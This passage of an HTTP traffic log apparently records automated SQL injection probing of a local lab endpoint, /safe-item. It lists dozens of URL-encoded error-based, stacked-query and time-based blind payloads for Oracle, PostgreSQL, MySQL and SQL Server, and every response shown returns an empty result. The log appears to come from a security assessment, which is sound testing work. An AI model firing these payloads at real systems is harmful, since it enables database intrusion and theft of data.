+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%285758%3D5758
+
+[]
+
+############################################################################
+
+HTTP request [#34]:
+GET /safe-item?id=1%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#34] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29
+
+[]
+
+############################################################################
+
+HTTP request [#35]:
+GET /safe-item?id=1%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20XHLL HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#35] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20XHLL
+
+[]
+
+############################################################################
+
+HTTP request [#36]:
+GET /safe-item?id=1%27%29%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27VbbY%27%3D%27VbbY HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#36] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27VbbY%27%3D%27VbbY
+
+[]
+
+############################################################################
+
+HTTP request [#37]:
+GET /safe-item?id=1%27%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27jNFU%27%3D%27jNFU HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#37] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%208258%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288258%3D8258%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27jNFU%27%3D%27jNFU
+
+[]
+
+############################################################################
+
+HTTP request [#38]:
+GET /safe-item?id=%28SELECT%20CONCAT%28CONCAT%28%27qjkzq%27%2C%28CASE%20WHEN%20%289242%3D9242%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qxvpq%27%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#38] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=%28SELECT%20CONCAT%28CONCAT%28%27qjkzq%27%2C%28CASE%20WHEN%20%289242%3D9242%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qxvpq%27%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#39]:
+GET /safe-item?id=1%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#39] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%3BSELECT%20PG_SLEEP%285%29--
+
+[]
+
+############################################################################
+
+HTTP request [#40]:
+GET /safe-item?id=1%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#40] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%3BSELECT%20PG_SLEEP%285%29--
+
+[]
+
+############################################################################
+
+HTTP request [#41]:
+GET /safe-item?id=1%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#41] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%3BSELECT%20PG_SLEEP%285%29--
+
+[]
+
+############################################################################
+
+HTTP request [#42]:
+GET /safe-item?id=1%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#42] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%3BSELECT%20PG_SLEEP%285%29--
+
+[]
+
+############################################################################
+
+HTTP request [#43]:
+GET /safe-item?id=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#43] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+[]
+
+############################################################################
+
+HTTP request [#44]:
+GET /safe-item?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#44] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+[]
+
+############################################################################
+
+HTTP request [#45]:
+GET /safe-item?id=1%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#45] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+[]
+
+############################################################################
+
+HTTP request [#46]:
+GET /safe-item?id=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#46] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--
+
+[]
+
+############################################################################
+
+HTTP request [#47]:
+GET /safe-item?id=1%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#47] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL--
+
+[]
+
+############################################################################
+
+HTTP request [#48]:
+GET /safe-item?id=1%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#48] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL--
+
+[]
+
+############################################################################
+
+HTTP request [#49]:
+GET /safe-item?id=1%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#49] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL--
+
+[]
+
+############################################################################
+
+HTTP request [#50]:
+GET /safe-item?id=1%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL-- HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#50] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28112%29%7C%7CCHR%2868%29%7C%7CCHR%2872%29%2C5%29%20FROM%20DUAL--
+
+[]
+
+############################################################################
+
+HTTP request [#51]:
+GET /safe-item?id=1%29%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%284674%3D4674 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#51] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%284674%3D4674
+
+[]
+
+############################################################################
+
+HTTP request [#52]:
+GET /safe-item?id=1%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#52] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29
+
+[]
+
+############################################################################
+
+HTTP request [#53]:
+GET /safe-item?id=1%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29--%20mMZX HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#53] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29--%20mMZX
+
+[]
+
+############################################################################
+
+HTTP request [#54]:
+GET /safe-item?id=1%27%29%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%28%27mBtu%27%3D%27mBtu HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#54] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%28%27mBtu%27%3D%27mBtu
+
+[]
+
+############################################################################
+
+HTTP request [#55]:
+GET /safe-item?id=1%27%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%27NeIW%27%3D%27NeIW HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#55] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%20%28SELECT%201453%20FROM%20%28SELECT%28SLEEP%285%29%29%29HgjM%29%20AND%20%27NeIW%27%3D%27NeIW
+
+[]
+
+############################################################################
+
+HTTP request [#56]:
+GET /safe-item?id=1%29%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%281166%3D1166 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#56] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%281166%3D1166
+
+[]
+
+############################################################################
+
+HTTP request [#57]:
+GET /safe-item?id=1%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#57] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29
+
+[]
+
+############################################################################
+
+HTTP request [#58]:
+GET /safe-item?id=1%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29--%20InKI HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#58] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29--%20InKI
+
+[]
+
+############################################################################
+
+HTTP request [#59]:
+GET /safe-item?id=1%27%29%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27SMEw%27%3D%27SMEw HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#59] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27SMEw%27%3D%27SMEw
+
+[]
+
+############################################################################
+
+HTTP request [#60]:
+GET /safe-item?id=1%27%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Rukt%27%3D%27Rukt HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#60] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%203941%3D%28SELECT%203941%20FROM%20PG_SLEEP%285%29%29%20AND%20%27Rukt%27%3D%27Rukt
+
+[]
+
+############################################################################
+
+HTTP request [#61]:
+GET /safe-item?id=1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286997%3D6997 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#61] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286997%3D6997
+
+[]
+
+############################################################################
+
+HTTP request [#62]:
+GET /safe-item?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#62] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27
+
+[]
+
+############################################################################
+
+HTTP request [#63]:
+GET /safe-item?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20RmYd HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#63] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20RmYd
+
+[]
+
+############################################################################
+
+HTTP request [#64]:
+GET /safe-item?id=1%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27gfKi%27%3D%27gfKi HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#64] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27gfKi%27%3D%27gfKi
+
+[]
+
+############################################################################
+
+HTTP request [#65]:
+GET /safe-item?id=1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27vCco%27%3D%27vCco HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#65] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27vCco%27%3D%27vCco
+
+[]
+
+############################################################################
+
+HTTP request [#66]:
+GET /safe-item?id=1%29%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%287380%3D7380 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#66] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%287380%3D7380
+
+[]
+
+############################################################################
+
+HTTP request [#67]:
+GET /safe-item?id=1%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29 HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#67] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29
+
+[]
+
+############################################################################
+
+HTTP request [#68]:
+GET /safe-item?id=1%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29--%20dUKc HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#68] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29--%20dUKc
+
+[]
+
+############################################################################
+
+HTTP request [#69]:
+GET /safe-item?id=1%27%29%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%28%27XqXp%27%3D%27XqXp HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#69] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%28%27XqXp%27%3D%27XqXp
+
+[]
+
+############################################################################
+
+HTTP request [#70]:
